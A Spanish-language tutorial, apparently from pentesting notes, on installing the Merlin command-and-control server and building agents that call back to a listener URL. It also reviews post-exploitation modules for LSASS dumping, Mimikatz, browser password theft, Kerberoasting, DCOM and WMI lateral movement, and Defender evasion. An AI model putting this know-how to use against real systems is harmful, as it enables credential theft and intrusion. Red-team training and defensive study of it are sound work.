# Instalación

## Instalar GO
```
#Download GO package from: https://golang.org/dl/
#Decompress the packe using:
tar -C /usr/local -xzf go$VERSION.$OS-$ARCH.tar.gz

#Change /etc/profile
Add ":/usr/local/go/bin" to PATH
Add "export GOPATH=$HOME/go"
Add "export GOBIN=$GOPATH/bin"

source /etc/profile
```
## Instalar Merlin
```
go get https://github.com/Ne0nd0g/merlin/tree/dev #It is recommended to use the developer branch
cd $GOPATH/src/github.com/Ne0nd0g/merlin/
```
# Iniciar el Servidor Merlin
```
go run cmd/merlinserver/main.go -i
```
# Agentes de Merlin

Puedes [descargar agentes precompilados](https://github.com/Ne0nd0g/merlin/releases)

## Compilar Agentes

Ve a la carpeta principal _$GOPATH/src/github.com/Ne0nd0g/merlin/_
```
#User URL param to set the listener URL
make #Server and Agents of all
make windows #Server and Agents for Windows
make windows-agent URL=https://malware.domain.com:443/ #Agent for windows (arm, dll, linux, darwin, javascript, mips)
```
## **Compilación manual de agentes**
```
GOOS=windows GOARCH=amd64 go build -ldflags "-X main.url=https://10.2.0.5:443" -o agent.exe main.g
```
# Módulos

**La mala noticia es que cada módulo utilizado por Merlin se descarga de la fuente (Github) y se guarda en el disco antes de usarlo. Ten cuidado al usar módulos conocidos porque Windows Defender te detectará.**

**SafetyKatz** --> Mimikatz modificado. Volcado de LSASS a archivo y lanzamiento: sekurlsa::logonpasswords a ese archivo\
**SharpDump** --> minivolcado para el ID de proceso especificado (LSASS por defecto) (Se dice que la extensión del archivo final es .gz pero en realidad es .bin, pero es un archivo .gz)\
**SharpRoast** --> Kerberoast (no funciona)\
**SeatBelt** --> Pruebas de seguridad local en CS (no funciona) https://github.com/GhostPack/Seatbelt/blob/master/Seatbelt/Program.cs\
**Compiler-CSharp** --> Compilar usando csc.exe /unsafe\
**Sharp-Up** --> Todas las comprobaciones en C# en powerup (funciona)\
**Inveigh** --> Suplantador de PowerShellADIDNS/LLMNR/mDNS/NBNS y herramienta de hombre en el medio (no funciona, necesita cargar: https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1)\
**Invoke-InternalMonologue** --> Suplanta a todos los usuarios disponibles y recupera una respuesta de desafío para cada uno (hash NTLM para cada usuario) (URL incorrecta)\
**Invoke-PowerThIEf** --> Roba formularios de IExplorer o lo hace ejecutar JS o inyecta una DLL en ese proceso (no funciona) (y el PS parece que tampoco funciona) https://github.com/nettitude/Invoke-PowerThIEf/blob/master/Invoke-PowerThIEf.ps1\
**LaZagneForensic** --> Obtener contraseñas del navegador (funciona pero no imprime el directorio de salida)\
**dumpCredStore** --> API del Administrador de credenciales de Win32 (https://github.com/zetlen/clortho/blob/master/CredMan.ps1) https://www.digitalcitizen.life/credential-manager-where-windows-stores-passwords-other-login-details\
**Get-InjectedThread** --> Detecta la inyección clásica en los procesos en ejecución (Inyección clásica (OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)) (no funciona)\
**Get-OSTokenInformation** --> Obtener información del token de los procesos y hilos en ejecución (Usuario, grupos, privilegios, propietario... https://docs.microsoft.com/es-es/windows/desktop/api/winnt/ne-winnt-\_token_information_class)\
**Invoke-DCOM** --> Ejecuta un comando (en otro equipo) a través de DCOM (http://www.enigma0x3.net.) (https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/)\
**Invoke-DCOMPowerPointPivot** --> Ejecuta un comando en otro PC abusando de los objetos COM de PowerPoint (ADDin)\
**Invoke-ExcelMacroPivot** --> Ejecuta un comando en otro PC abusando de DCOM en Excel\
**Find-ComputersWithRemoteAccessPolicies** --> (no funciona) (https://labs.mwrinfosecurity.com/blog/enumerating-remote-access-policies-through-gpo/)\
**Grouper** --> Hace una volcado de todas las partes más interesantes de la directiva de grupo y luego busca en ellas cosas explotables. (obsoleto) Echa un vistazo a Grouper2, parece muy bueno\
**Invoke-WMILM** --> WMI para moverse lateralmente\
**Get-GPPPassword** --> Busca groups.xml, scheduledtasks.xml, services.xml y datasources.xml y devuelve contraseñas en texto plano (dentro del dominio)\
**Invoke-Mimikatz** --> Usa mimikatz (credenciales por defecto)\
**PowerUp** --> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc\
**Find-BadPrivilege** --> Comprueba los privilegios de los usuarios en los equipos\
**Find-PotentiallyCrackableAccounts** --> Recupera información sobre las cuentas de usuario asociadas con SPN (Kerberoasting)\
**psgetsystem** --> getsystem

**No se comprobaron los módulos de persistencia**

# Resumen

Realmente me gusta la sensación y el potencial de la herramienta.\
Espero que la herramienta comience a descargar los módulos desde el servidor e integre algún tipo de evasión al descargar scripts.
